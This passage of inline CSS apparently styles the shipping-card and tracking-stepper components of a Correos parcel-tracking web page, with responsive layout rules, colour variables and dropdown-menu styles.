			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__date-title.sc-correos-cdk-shipping-card {
				display: block;
				font-size: 12px;
				line-height: 18px;
				font-weight: 300;
				color: var(--_cdk-shipping-card-container-color-text-title)
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__date-title.sc-correos-cdk-shipping-card {
					font-size: 0.85rem;
					line-height: 24px
				}
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__date-value.sc-correos-cdk-shipping-card {
				display: block;
				font-weight: bold;
				font-size: 14px;
				line-height: 22px;
				color: var(--_cdk-shipping-card-container-color-text-value)
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__date-value.sc-correos-cdk-shipping-card {
					font-size: 1rem;
					line-height: 24px
				}
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card {
				width: 50%;
				display: inline-block;
				vertical-align: middle;
				margin-left: 5px;
				padding-left: 17px;
				position: relative
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card {
					width: 50%;
					padding-left: 10px;
					margin-left: 0
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card {
					width: calc(50% - 1rem);
					margin-left: 1rem;
					padding-left: 25px
				}
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card:before {
				content: "";
				position: absolute;
				left: 0;
				top: 0;
				width: 1px;
				height: 48px;
				background-color: var(--_cdk-shipping-card-border-color);
				-webkit-transform: translate(0%, -25%);
				transform: translate(0%, -25%)
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__bundle.sc-correos-cdk-shipping-card {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: justify;
				justify-content: space-between
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__items-packages.sc-correos-cdk-shipping-card {
				font-weight: bold;
				font-size: 14px;
				color: var(--_cdk-shipping-card-container-color-text-packages);
				margin-left: 10px
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__items-packages.sc-correos-cdk-shipping-card {
					font-size: 1rem
				}
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__items-box-icon.sc-correos-cdk-shipping-card {
				font-size: 20px;
				color: var(--_cdk-shipping-card-container-color-icon)
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__btn-menu.sc-correos-cdk-shipping-card {
				display: inline-block
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__btn-menu--absolute.sc-correos-cdk-shipping-card {
				position: absolute;
				right: 27px;
				top: 65%;
				-webkit-transform: translate(-50%, 150%);
				transform: translate(-50%, 150%)
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__icon.sc-correos-cdk-shipping-card {
				position: relative;
				height: 8px;
				width: 8px;
				margin-left: 10px;
				outline: none
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__icon.sc-correos-cdk-shipping-card::before,
			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__icon.sc-correos-cdk-shipping-card::after {
				content: "";
				position: absolute;
				bottom: 0px;
				width: 0.1rem;
				height: 100%;
				border-radius: 8px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__icon.sc-correos-cdk-shipping-card::before {
				left: -2px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(-45deg);
				transform: rotate(-45deg);
				background-color: var(--_cdk-shipping-card-container-color-icon)
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__icon.sc-correos-cdk-shipping-card::after {
				left: 2.5px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(45deg);
				transform: rotate(45deg);
				background-color: var(--_cdk-shipping-card-container-color-icon)
			}

			@media (min-width: 640px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__icon.sc-correos-cdk-shipping-card {
					margin-left: 5px
				}
			}

			@media (min-width: 1024px) {
				.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__icon.sc-correos-cdk-shipping-card {
					margin-left: 10px
				}
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__icon.sc-correos-cdk-shipping-card:hover {
				cursor: pointer
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__icon.sc-correos-cdk-shipping-card:focus {
				outline: none
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__icon.focus-visible.sc-correos-cdk-shipping-card {
				outline: groove
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-detail.sc-correos-cdk-shipping-card {
				opacity: 0;
				height: 0
			}

			.sc-correos-cdk-shipping-card-h .cdk-shipping-card-detail.sc-correos-cdk-shipping-card>.sc-correos-cdk-shipping-card.sc-correos-cdk-shipping-card {
				display: none
			}

			.cdk-option-menu.sc-correos-cdk-shipping-card {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-pack: justify;
				justify-content: space-between
			}

			.cdk-option-menu--no-margin.sc-correos-cdk-shipping-card {
				width: 0
			}

			.cdk-option-menu__item--align-end.sc-correos-cdk-shipping-card {
				width: 100%;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-pack: end;
				justify-content: flex-end
			}

			.cdk-option-menu__item.--extra-margin.sc-correos-cdk-shipping-card {
				margin-right: 24px
			}

			.cdk-option-menu__item.--extra-margin.sc-correos-cdk-shipping-card .cdk-option-menu__list-button.sc-correos-cdk-shipping-card {
				min-width: -webkit-max-content;
				min-width: -moz-max-content;
				min-width: max-content
			}

			.cdk-option-menu__list.sc-correos-cdk-shipping-card {
				display: none
			}

			@media (min-width: 640px) {
				.cdk-option-menu__list.sc-correos-cdk-shipping-card {
					-webkit-margin-before: 0;
					margin-block-start: 0;
					-webkit-margin-after: 0;
					margin-block-end: 0;
					margin: 0;
					padding: 0;
					list-style: none;
					width: calc(100% - 34px);
					display: -ms-flexbox;
					display: flex;
					-ms-flex-align: center;
					align-items: center;
					-ms-flex-pack: distribute;
					justify-content: space-around
				}
			}

			.cdk-option-menu__btn.sc-correos-cdk-shipping-card,
			.cdk-option-menu__kebab-menu.sc-correos-cdk-shipping-card {
				border: unset;
				cursor: pointer;
				margin: 0;
				padding: 0;
				width: unset;
				overflow: unset;
				background: unset;
				text-align: flex-start;
				color: inherit;
				font: inherit;
				line-height: inherit;
				-webkit-font-smoothing: inherit;
				-moz-osx-font-smoothing: inherit;
				-webkit-appearance: none;
				color: var(--_cdk-shipping-card-container-color-icon)
			}

			.cdk-option-menu__btn.sc-correos-cdk-shipping-card::-moz-focus-inner,
			.cdk-option-menu__kebab-menu.sc-correos-cdk-shipping-card::-moz-focus-inner {
				border: 0;
				padding: 0
			}

			.cdk-option-menu__btn.--hide.sc-correos-cdk-shipping-card,
			.cdk-option-menu__kebab-menu.--hide.sc-correos-cdk-shipping-card {
				display: none
			}

			.cdk-option-menu__btn.sc-correos-cdk-shipping-card {
				display: none
			}

			@media (min-width: 640px) {
				.cdk-option-menu__btn.sc-correos-cdk-shipping-card {
					display: block;
					font-size: 14px;
					line-height: 20px;
					font-weight: bold
				}
			}

			@media (min-width: 1024px) {
				.cdk-option-menu__btn.sc-correos-cdk-shipping-card {
					font-size: 1rem
				}
			}

			.cdk-hiddenmenu.sc-correos-cdk-shipping-card {
				-webkit-margin-before: 0;
				margin-block-start: 0;
				-webkit-margin-after: 0;
				margin-block-end: 0;
				margin: 0;
				padding: 0;
				list-style: none;
				width: 210px;
				display: none;
				position: absolute;
				right: 0;
				top: 100%;
				background: var(--_cdk-shipping-card-bg-color);
				-webkit-box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
				box-shadow: 0 5px 10px 0 rgba(0, 0, 0, 0.1);
				border: 2px solid var(--_cdk-shipping-card-container-color-icon);
				z-index: 2;
				border-bottom-left-radius: 8px;
				border-bottom-right-radius: 8px
			}

			.cdk-hiddenmenu.active.sc-correos-cdk-shipping-card {
				display: block
			}

			.cdk-hiddenmenu__items.sc-correos-cdk-shipping-card {
				padding: 16px;
				text-align: center;
				width: 100%
			}

			.cdk-hiddenmenu__items.sc-correos-cdk-shipping-card:hover,
			.cdk-hiddenmenu__items.sc-correos-cdk-shipping-card:focus {
				text-decoration: underline;
				background-color: rgba(0, 46, 109, 0.1)
			}

			.cdk-hiddenmenu__items--hidden-desktop.sc-correos-cdk-shipping-card {
				display: block;
				width: 100%
			}

			@media (min-width: 640px) {
				.cdk-hiddenmenu__items--hidden-desktop.sc-correos-cdk-shipping-card {
					display: none
				}
			}

			.cdk-hiddenmenu__items.sc-correos-cdk-shipping-card:nth-child(even) {
				background: var(--_cdk-shipping-card-menu-bg-color)
			}

			.cdk-hiddenmenu__items.sc-correos-cdk-shipping-card:nth-child(even):hover,
			.cdk-hiddenmenu__items.sc-correos-cdk-shipping-card:nth-child(even):focus {
				text-decoration: underline;
				background-color: rgba(0, 46, 109, 0.1)
			}

			.cdk-hiddenmenu__items.sc-correos-cdk-shipping-card:last-child {
				border-bottom-left-radius: 8px;
				border-bottom-right-radius: 8px
			}

			.cdk-hiddenmenu__btn.sc-correos-cdk-shipping-card {
				border: unset;
				cursor: pointer;
				margin: 0;
				padding: 0;
				width: unset;
				overflow: unset;
				background: unset;
				text-align: flex-start;
				color: inherit;
				font: inherit;
				line-height: inherit;
				-webkit-font-smoothing: inherit;
				-moz-osx-font-smoothing: inherit;
				-webkit-appearance: none;
				font-size: 14px;
				line-height: 20px;
				color: var(--_cdk-shipping-card-container-color-icon)
			}

			.cdk-hiddenmenu__btn.sc-correos-cdk-shipping-card::-moz-focus-inner {
				border: 0;
				padding: 0
			}

			@media (min-width: 1024px) {
				.cdk-hiddenmenu__btn.sc-correos-cdk-shipping-card {
					font-size: 1rem;
					line-height: 24px
				}
			}

			.detailSectionOpened.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container.sc-correos-cdk-shipping-card {
				border-bottom: solid 1px var(--_cdk-shipping-card-border-color)
			}

			.detailSectionOpened.sc-correos-cdk-shipping-card-h .cdk-shipping-card-detail.sc-correos-cdk-shipping-card {
				height: auto;
				opacity: 1;
				-webkit-transition: all 0.45s cubic-bezier(0.55, 0.05, 0.05, 0.96);
				transition: all 0.45s cubic-bezier(0.55, 0.05, 0.05, 0.96);
				-webkit-transition-property: opacity;
				transition-property: opacity;
				padding: 15px 13px 24px 17px
			}

			.detailSectionOpened.sc-correos-cdk-shipping-card-h .cdk-shipping-card-detail.sc-correos-cdk-shipping-card>.sc-correos-cdk-shipping-card.sc-correos-cdk-shipping-card {
				display: block
			}

			@media (min-width: 640px) {
				.detailSectionOpened.sc-correos-cdk-shipping-card-h .cdk-shipping-card-detail.sc-correos-cdk-shipping-card {
					padding: 16px 24px 16px 24px
				}
			}

			.detailSectionOpened.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__icon.sc-correos-cdk-shipping-card::before {
				left: -2px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(45deg);
				transform: rotate(45deg)
			}

			.detailSectionOpened.sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__icon.sc-correos-cdk-shipping-card::after {
				left: 2.5px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(-45deg);
				transform: rotate(-45deg)
			}

			.detailSectionOpened[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container.sc-correos-cdk-shipping-card,
			.detailSectionOpened[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container.sc-correos-cdk-shipping-card {
				border-bottom: 0
			}

			.detailSectionOpened[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-detail.sc-correos-cdk-shipping-card,
			.detailSectionOpened[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-detail.sc-correos-cdk-shipping-card {
				position: relative
			}

			.detailSectionOpened[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-detail.sc-correos-cdk-shipping-card:before,
			.detailSectionOpened[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-detail.sc-correos-cdk-shipping-card:before {
				content: "";
				position: absolute;
				left: 0;
				top: 0;
				width: 95%;
				height: 1px;
				background: var(--_cdk-shipping-card-border-color);
				-webkit-transform: translate(3%, 0%);
				transform: translate(3%, 0%)
			}

			[size=md].sc-correos-cdk-shipping-card-h .cdk-shipping-card-multi-package__expedition.sc-correos-cdk-shipping-card {
				font-size: 20px;
				line-height: 26px
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-multi-package.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-multi-package.sc-correos-cdk-shipping-card {
				margin-bottom: 8px;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-direction: column;
				flex-direction: column;
				-ms-flex-align: start;
				align-items: flex-start
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-multi-package__container-expedition.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-multi-package__container-expedition.sc-correos-cdk-shipping-card {
				margin-bottom: 8px
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-multi-package__expedition.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-multi-package__expedition.sc-correos-cdk-shipping-card {
				font-size: 18px;
				line-height: 26px
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-content--margin.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-content--margin.sc-correos-cdk-shipping-card {
				margin-bottom: 16px
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__manage.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__manage.sc-correos-cdk-shipping-card {
				display: none
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-header.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-header.sc-correos-cdk-shipping-card {
				padding: 16px 20px
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number.sc-correos-cdk-shipping-card {
				width: auto
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number--icon.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-header__tracking_number--icon.sc-correos-cdk-shipping-card {
				font-size: 18px;
				width: 18px;
				margin-right: 16px
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container.sc-correos-cdk-shipping-card {
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap;
				padding: 15px 30px 17px 17px
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__steeper.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__steeper.sc-correos-cdk-shipping-card {
				-ms-flex: 0 1 100%;
				flex: 0 1 100%;
				width: 100%;
				padding-bottom: 16px;
				position: relative;
				padding-left: 0
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__steeper.sc-correos-cdk-shipping-card:after,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__steeper.sc-correos-cdk-shipping-card:after {
				content: "";
				position: absolute;
				left: 0;
				bottom: 0;
				width: 100%;
				height: 1px;
				background-color: var(--_cdk-shipping-card-border-color)
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__date-title.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__date-title.sc-correos-cdk-shipping-card {
				font-size: 12px;
				line-height: 18px
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__date-value.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__date-value.sc-correos-cdk-shipping-card {
				font-size: 14px;
				line-height: 22px
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__relabeling-container.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__relabeling-container.sc-correos-cdk-shipping-card {
				-ms-flex: 0 1 100%;
				flex: 0 1 100%;
				width: 100%;
				padding: 15px 0;
				padding-bottom: 25px;
				padding-left: 0;
				position: relative
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__relabeling-container.sc-correos-cdk-shipping-card:before,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__relabeling-container.sc-correos-cdk-shipping-card:before {
				content: none
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__relabeling-container.sc-correos-cdk-shipping-card:after,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__relabeling-container.sc-correos-cdk-shipping-card:after {
				content: "";
				position: absolute;
				left: 0;
				bottom: 0;
				width: 100%;
				height: 1px;
				background-color: var(--_cdk-shipping-card-border-color)
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package.sc-correos-cdk-shipping-card {
				-ms-flex: 0 1 calc(100% - 40px);
				flex: 0 1 calc(100% - 40px);
				padding-top: 15px
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--left.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--left.sc-correos-cdk-shipping-card {
				-ms-flex-pack: end;
				justify-content: flex-end;
				padding-top: 15px
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--left.sc-correos-cdk-shipping-card .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--left.sc-correos-cdk-shipping-card .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card {
				width: 100%
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--left.sc-correos-cdk-shipping-card .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card:before,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--left.sc-correos-cdk-shipping-card .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card:before {
				content: none
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--left.sc-correos-cdk-shipping-card .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--left.sc-correos-cdk-shipping-card .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card {
				margin-left: 0;
				padding-left: 0
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--without-date.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--without-date.sc-correos-cdk-shipping-card {
				-ms-flex-pack: justify;
				justify-content: space-between
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--without-date.sc-correos-cdk-shipping-card+.cdk-shipping-card-container__btn-menu.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--without-date.sc-correos-cdk-shipping-card+.cdk-shipping-card-container__btn-menu.sc-correos-cdk-shipping-card {
				-webkit-transform: translate(-50%, 0%);
				transform: translate(-50%, 0%)
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--md.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--md.sc-correos-cdk-shipping-card {
				padding-top: 0;
				-ms-flex: 0 1 100%;
				flex: 0 1 100%;
				margin-left: 0;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-wrap: wrap;
				flex-wrap: wrap;
				-ms-flex-align: center;
				align-items: center
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--md.sc-correos-cdk-shipping-card .cdk-shipping-card-container__relabeling-container.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--md.sc-correos-cdk-shipping-card .cdk-shipping-card-container__relabeling-container.sc-correos-cdk-shipping-card {
				-ms-flex: 0 1 100%;
				flex: 0 1 100%;
				margin-bottom: 15px
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--md.sc-correos-cdk-shipping-card .cdk-shipping-card-container__dateitems.sc-correos-cdk-shipping-card,
			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--md.sc-correos-cdk-shipping-card .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--md.sc-correos-cdk-shipping-card .cdk-shipping-card-container__dateitems.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--md.sc-correos-cdk-shipping-card .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card {
				-ms-flex: 0 1 calc(50% - 1rem);
				flex: 0 1 calc(50% - 1rem)
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--md.sc-correos-cdk-shipping-card .cdk-shipping-card-container__dateitems.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__info-package--md.sc-correos-cdk-shipping-card .cdk-shipping-card-container__dateitems.sc-correos-cdk-shipping-card {
				padding-left: 0
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__dateitems.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__dateitems.sc-correos-cdk-shipping-card {
				padding-left: 0
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__dateitems.sc-correos-cdk-shipping-card:before,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__dateitems.sc-correos-cdk-shipping-card:before {
				content: none
			}

			@media (min-width: 640px) {

				[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card,
				[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card {
					padding-left: 25px
				}
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card:before,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card:before {
				height: 40px;
				-webkit-transform: translate(0%, -25%);
				transform: translate(0%, -25%)
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__btn-menu.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__btn-menu.sc-correos-cdk-shipping-card {
				padding-top: 15px
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__btn-menu--absolute.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__btn-menu--absolute.sc-correos-cdk-shipping-card {
				padding-top: 0;
				position: absolute;
				right: 25px;
				top: auto;
				bottom: 25px;
				-webkit-transform: translate(-50%, -100%);
				transform: translate(-50%, -100%)
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-option-menu.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-option-menu.sc-correos-cdk-shipping-card {
				-ms-flex-pack: end;
				justify-content: flex-end;
				width: auto
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-option-menu__list.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-option-menu__list.sc-correos-cdk-shipping-card {
				display: none
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-option-menu__btn.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-option-menu__btn.sc-correos-cdk-shipping-card {
				display: none
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-hiddenmenu__items--hidden-desktop.sc-correos-cdk-shipping-card,
			[size=sm].sc-correos-cdk-shipping-card-h .cdk-hiddenmenu__items--hidden-desktop.sc-correos-cdk-shipping-card {
				display: block;
				width: 100%
			}

			[size=xs].sc-correos-cdk-shipping-card-h .cdk-shipping-card-container__package.sc-correos-cdk-shipping-card {
				padding-left: 10px
			}
		</style>
		<style>
			.sc-correos-ui-tracking-stepper-h {
				--_ui-tracking-stepper-bg-color: var(--ui-tracking-stepper-bg-color, #F9F8F8);
				--_ui-tracking-stepper-border-bottom: var(--ui-tracking-stepper-border-bottom, #cbcbcb);
				--_ui-tracking-stepper-line-done-color: var(--ui-tracking-stepper-line-done-color, #348f41);
				--_ui-tracking-stepper-line-undone-color: var(--ui-tracking-stepper-line-undone-color, #949494);
				--_ui-tracking-stepper-dot-active-color: var(--ui-tracking-stepper-dot-active-color, #ffcd00);
				--_ui-tracking-stepper-dot-done-color: var(--ui-tracking-stepper-dot-done-color, #348f41);
				--_ui-tracking-stepper-dot-undone-color: var(--ui-tracking-stepper-dot-undone-color, #949494);
				--_ui-tracking-stepper-icon-active-color: var(--ui-tracking-stepper-icon-active-color, #002453);
				--_ui-tracking-stepper-icon-done-color: var(--ui-tracking-stepper-icon-done-color, #348f41);
				--_ui-tracking-stepper-font-color: var(--ui-tracking-stepper-icon-font-color, #333333);
				--_ui-tracking-stepper-error: var(--ui-tracking-stepper-error, #f32735);
				--_ui-tracking-stepper-white: var(--ui-tracking-stepper-white, #ffffff);
				--_ui-tracking-stepper-blue: var(--ui-tracking-stepper-blue, #002E6D)
			}

			.sc-correos-ui-tracking-stepper-h {
				display: block
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__title.sc-correos-ui-tracking-stepper {
				display: inline-block
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__icon.sc-correos-ui-tracking-stepper {
				position: relative;
				height: 8px;
				width: 8px;
				margin-left: 10px
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__icon.sc-correos-ui-tracking-stepper::before,
			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__icon.sc-correos-ui-tracking-stepper::after {
				content: "";
				position: absolute;
				bottom: 0px;
				width: 0.1rem;
				height: 100%;
				border-radius: 8px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__icon.sc-correos-ui-tracking-stepper::before {
				left: -2px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(-45deg);
				transform: rotate(-45deg);
				background-color: var(--_cdk-shipping-card-container-color-icon)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__icon.sc-correos-ui-tracking-stepper::after {
				left: 2.5px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(45deg);
				transform: rotate(45deg);
				background-color: var(--_cdk-shipping-card-container-color-icon)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__icon.opened.sc-correos-ui-tracking-stepper::before {
				left: -2px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(45deg);
				transform: rotate(45deg)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__icon.opened.sc-correos-ui-tracking-stepper::after {
				left: 2.5px;
				-webkit-transition: all 0.2s;
				transition: all 0.2s;
				-webkit-transform: rotate(-45deg);
				transform: rotate(-45deg)
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__icon-error.sc-correos-ui-tracking-stepper {
				color: var(--_ui-tracking-stepper-error);
				font-size: 24px;
				margin-right: 8px
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__lnk-map.sc-correos-ui-tracking-stepper {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				color: initial;
				text-decoration: none;
				margin-top: 0.8125rem;
				display: -ms-flexbox;
				display: flex;
				-ms-flex-align: center;
				align-items: center
			}

			@media (min-width: 1024px) {
				.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__lnk-map.sc-correos-ui-tracking-stepper {
					margin-top: 1.125rem
				}
			}

			.sc-correos-ui-tracking-stepper-h .correos-ui-tracking-stepper__txt-map.sc-correos-ui-tracking-stepper {
				font-size: 100%;
				margin: 0;
				padding: 0;
				font-weight: normal;
				font-size: 0.875rem;
